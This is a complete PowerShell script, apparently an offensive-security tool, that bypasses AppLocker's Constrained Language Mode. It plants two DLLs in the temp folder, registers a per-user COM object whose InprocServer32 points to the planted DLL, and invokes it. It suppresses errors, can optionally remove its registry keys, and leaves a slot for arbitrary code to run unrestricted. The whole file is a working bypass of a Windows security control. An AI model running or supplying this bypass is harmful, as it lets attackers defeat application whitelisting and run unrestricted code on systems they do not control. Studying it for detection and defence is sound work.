
# -------------------------
$comName = "ClmDisableDll"
$comDescription = "CLM Disable COM"

$srcDllPath = '.\ClmDisableDll.dll'
$dstDllPath = "$($Env:Temp)\ClmDisableDll.dll"

$srcAssemblyPath = '.\ClmDisableAssembly.dll'
$dstAssemblyPath = "$($Env:Temp)\ClmDisableAssembly.dll"

$guid = "{394aaa50-684e-4870-911a-d045293b3b13}"
# -------------------------

function Bypass-CLM 
{ 
    param(
       [switch]$RemoveComWhenFinished
    )  

    $ErrorActionPreference = "SilentlyContinue"

    function Create-COM {
        param(
            [Parameter(Mandatory = $true)]
            [string]$comName,

            [Parameter(Mandatory = $true)]
            [string]$comDescription,

            [Parameter(Mandatory = $true)]
            [string]$dllPath,

            [Parameter(Mandatory = $true)]
            [string]$guid
        )
        
        # Obtains current user SID, can't use System.Security.Principal.NTAccount
        # type because we are in Constrained Language Mode
        $sid = (whoami /user | select-string -Pattern "(S-1-5[0-9-]+)" -all | select -ExpandProperty Matches).value

        New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS
        $key = 'HKU:\{0}_classes' -f $sid

        # Adding our own InProcServer32
        $key = 'HKU:\{0}_classes\CLSID\' -f $sid
        New-Item -Path $key -Name $guid
        $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, $guid
        New-Item -Path $key -Name 'InProcServer32'
        New-ItemProperty -Path $key -Name '(Default)' -Value $comDescription -PropertyType String -Force
        $key = 'HKU:\{0}_classes\CLSID\{1}\InProcServer32' -f $sid, $guid
        New-ItemProperty -Path $key -Name '(Default)' -Value $dllPath -PropertyType String -Force
        New-ItemProperty -Path $key -Name 'ThreadingModel' -Value "Apartment" -PropertyType String -Force

        # Registering COM's ProgID / shortname
        $key = 'HKU:\{0}_classes' -f $sid
        New-Item -Path $key -Name $comName
        $key = 'HKU:\{0}_classes\{1}' -f $sid, $comName
        New-ItemProperty -Path $key -Name '(Default)' -Value $comDescription -PropertyType String -Force
        New-Item -Path $key -Name 'CLSID'
        $key = 'HKU:\{0}_classes\{1}\CLSID' -f $sid, $comName
        New-ItemProperty -Path $key -Name '(Default)' -Value $guid -PropertyType String -Force
    }

    function Remove-COM {
        param(
            [Parameter(Mandatory = $true)]
            [string]$comName,

            [Parameter(Mandatory = $true)]
            [string]$guid
        )

        $sid = (whoami /user | select-string -Pattern "(S-1-5[0-9-]+)" -all | select -ExpandProperty Matches).value

        New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null
        $key = 'HKU:\{0}_classes\{1}' -f $sid, $comName
        Remove-Item -Path $key -Recurse | Out-Null

        $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, $guid
        Remove-Item -Path $key -Recurse | Out-Null
    }

    function Invoke-PS {
        param(
            [Parameter(Mandatory = $true)]
            [string]$Commands
        )

        $Runspace = [runspacefactory]::CreateRunspace()
        $posh = [powershell]::Create()
        $posh.runspace = $Runspace
        $Runspace.Open()
        
        [void]$posh.AddScript($Commands)
        $posh.Invoke()
        $posh.Dispose() | Out-Null
    }

    Write-Host "`tAppLocker Constrined Language Mode Bypass via COM"
    Write-Host "`t(implementation of: @xpn's technique, as documented in:)"
    Write-Host "`t(https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/)"
    Write-Host "`n`tRe-implemented, enhanced by: Mariusz Banach, mgeeky"
    Write-Host "`t-----`n"

    Write-Host "[.] Step 0. Planted DLL files in:`n`t$dstAssemblyPath`n`t$dstDllPath"

    Copy-Item $srcDllPath $dstDllPath -Force
    Copy-Item $srcAssemblyPath $dstAssemblyPath -Force

    Write-Host "[.] Step 1. Creating custom COM object."

    Create-COM -ComName $comName -ComDescription $comDescription -DllPath $dstDllPath -Guid $guid | Out-Null

    Write-Host "[.] Step 2. Invoking it ($comName)..."

    Write-Host "`tPowershell runspace Thread ID: $([appdomain]::GetCurrentThreadId())"
    try
    {
        New-Object -ComObject $comName -erroraction 'silentlycontinue' | Out-Null
    }
    catch
    {
    }

    if($RemoveComWhenFinished)
    {  
        Write-Host "[.] Removing registered COM object."
        Remove-COM -ComName $comName -Guid $guid
    }
    else
    {
        Write-Host "`n============"
        Write-Host -ForegroundColor Yellow "`nUse below command to disable CLM on Demand (ignore errors):"
        Write-Host "`n`tPS> " -NoNewLine
        Write-Host -ForegroundColor Green "New-Object -ComObject $comName"
        Write-Host "`n============`n"
    }


    #############################################################
    #
    # PUT YOUR CODE BELOW THAT IS GOING TO BE RUN IN CLM DISABLED
    #

    Write-Host "`n[+] Finished. CLM status: $($ExecutionContext.SessionState.LanguageMode)"

    #############################################################
}

Bypass-CLM